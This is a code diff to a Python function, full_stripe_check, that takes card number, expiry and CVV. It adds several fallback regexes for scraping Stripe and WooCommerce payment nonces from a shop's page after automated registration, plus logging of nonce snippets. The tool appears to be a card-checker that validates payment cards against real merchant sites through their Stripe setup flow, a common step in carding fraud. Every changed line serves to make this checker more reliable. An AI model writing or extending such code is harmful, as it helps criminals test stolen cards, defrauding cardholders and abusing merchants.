@@ -88,21 +88,40 @@ def full_stripe_check(cc, mm, yy, cvv):
         
         logger.debug(f"Payment page length: {len(payment_page_res.text)} chars")
         
+        # Try multiple patterns to find the nonce
         payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
         if not payment_nonce_match:
-            # Try alternative patterns
-            logger.warning("Primary payment nonce pattern failed, trying alternative...")
-            payment_nonce_match = re.search(r'createAndConfirmSetupIntentNonce["\s:]+["\'](.*?)["\']', payment_page_res.text)
+            logger.warning("Primary payment nonce pattern failed, trying alternative patterns...")
+            # Try pattern with single quotes
+            payment_nonce_match = re.search(r"'createAndConfirmSetupIntentNonce':'(.*?)'", payment_page_res.text)
+        if not payment_nonce_match:
+            # Try with spaces
+            payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"(.*?)"', payment_page_res.text)
+        if not payment_nonce_match:
+            # Try looking for any nonce-like pattern
+            payment_nonce_match = re.search(r'setupIntentNonce["\']?\s*[:\=]\s*["\']([a-f0-9]{10,})["\']', payment_page_res.text, re.IGNORECASE)
+        if not payment_nonce_match:
+            # Search for wc_stripe_ ajax nonce patterns
+            payment_nonce_match = re.search(r'wc_stripe.*?nonce["\']?\s*[:\=]\s*["\']([a-f0-9]{10,})["\']', payment_page_res.text, re.IGNORECASE)
+        if not payment_nonce_match:
+            # Last resort: look for any _ajax_nonce or woocommerce nonce
+            payment_nonce_match = re.search(r'_ajax_nonce["\']?\s*[:\=]\s*["\']([a-f0-9]{10,})["\']', payment_page_res.text)
         
         if not payment_nonce_match:
-            logger.error("Failed to extract payment nonce from page")
+            logger.error("Failed to extract payment nonce from page with all patterns")
             # Check if we're logged in by looking for account elements
             if 'my-account' in payment_page_res.url or 'logout' in payment_page_res.text.lower():
                 logger.info("Session appears valid (logged in)")
             else:
                 logger.warning("May not be logged in - registration might have failed")
-            logger.debug(f"Payment page preview: {payment_page_res.text[:500]}")
-            return {"status": "Declined", "response": "Failed to get payment nonce. Registration may have failed.", "decline_type": "process_error"}
+            
+            # Log more of the page to find nonce patterns
+            logger.debug(f"Searching for 'nonce' in page...")
+            nonce_snippets = re.findall(r'.{0,50}nonce.{0,50}', payment_page_res.text, re.IGNORECASE)
+            for i, snippet in enumerate(nonce_snippets[:5]):  # Log first 5 matches
+                logger.debug(f"Nonce snippet {i+1}: {snippet}")
+            
+            return {"status": "Declined", "response": "Failed to get payment nonce. Check logs for nonce patterns.", "decline_type": "process_error"}
         
         ajax_nonce = payment_nonce_match.group(1)
         logger.info(f"Payment nonce extracted: {ajax_nonce[:10]}...")
